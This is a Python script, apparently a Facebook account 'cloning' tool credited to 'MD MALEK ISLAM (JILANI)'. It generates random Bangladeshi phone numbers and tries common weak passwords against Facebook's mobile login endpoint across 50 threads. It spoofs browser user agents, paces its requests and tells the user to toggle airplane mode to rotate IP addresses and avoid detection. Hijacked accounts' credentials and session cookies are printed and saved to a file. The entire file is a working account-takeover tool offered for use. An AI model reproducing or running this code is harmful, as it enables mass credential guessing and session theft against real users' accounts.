import os, time, sys, random, requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# Professional UI Colors
G = '\033[1;32m'; W = '\033[1;37m'; R = '\033[1;31m'
Y = '\033[1;33m'; B = '\033[1;34m'

loop = 0
ok = []

def banner():
    os.system('clear')
    print(f"""
{R}     ███    ███  ███████  ████████  █████  
{G}     ████  ████  ██          ██    ██   ██ 
{Y}     ██ ████ ██  █████       ██    ███████ 
{B}     ██  ██  ██  ██          ██    ██   ██ 
{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}
| [✓] OWNER        : MD MALEK ISLAM (JILANI)   |
| [✓] MISSION      : BREAK THE ZERO OK STATUS  |
| [✓] UPDATE       : IP-ROTATION & FRESH UA    |
{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}""")

def main():
    banner()
    print(f'{G}[1] START THE MISSION FOR OK')
    print(f'[0] EXIT')
    opt = input(f'{Y}[?] SELECT : {W}')
    if opt == '1':
        cloning_start()
    else: sys.exit()

def cloning_start():
    banner()
    codes = input(f'{G}[+] ENTER SIM CODES (e.g. 017 019 018): {W}').split()
    limit = int(input(f'{G}[+] LIMIT PER CODE: {W}'))
    
    banner()
    print(f'{G}[✓] HUNTING... PLEASE TURN ON/OFF AIRPLANE MODE EVERY 5 MINS{W}')
    print(f'{G}--------------------------------------------------{W}')

    with ThreadPool(max_workers=50) as pool:
        for code in codes:
            for _ in range(limit):
                num = "".join(random.choice("0123456789") for _ in range(8))
                uid = code + num
                # Highly success-prone passwords
                pws = [uid, uid[-6:], uid[-7:], '786786', '123456', '@@@###', 'Bangladesh', '102030', '778899'] 
                pool.submit(login_engine, uid, pws, limit * len(codes))

def login_engine(uid, pws, total_limit):
    global loop, ok
    sys.stdout.write(f'\r{W}[JILANI-HUNT] {loop}/{total_limit} [OK:{len(ok)}]'); sys.stdout.flush()
    
    for pas in pws:
        time.sleep(random.uniform(0.8, 1.8)) 
        session = requests.Session()
        
        # Super-Fresh User Agent for 2026
        ua = f"Mozilla/5.0 (Linux; Android {random.randint(11,14)}; SM-S9{random.randint(10,99)}B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120,131)}.0.0.0 Mobile Safari/537.36"
        
        headers = {
            'authority': 'm.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'referer': 'https://m.facebook.com/login/',
            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="131", "Google Chrome";v="131"',
            'user-agent': ua,
        }
        
        url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
        data = {
            "lsd": "AVpY", "jazoest": "2931", "m_ts": str(int(time.time())),
            "email": uid, "pass": pas
        }

        try:
            res = session.post(url, data=data, headers=headers, timeout=25)
            cookies = session.cookies.get_dict()
            
            # The result you are crying for
            if "c_user" in cookies:
                full_cookie = ";".join([f"{k}={v}" for k, v in cookies.items()])
                print(f'\n{G}[JILANI-OK💚] {uid} | {pas}') 
                print(f'{G}[🍪] COOKIE = {full_cookie}\n')
                ok.append(uid)
                with open('/sdcard/JILANI-SUCCESS.txt', 'a') as f:
                    f.write(f'{uid}|{pas}|{full_cookie}\n')
                break
        except: pass
            
    loop += 1

if __name__ == "__main__":
    main()
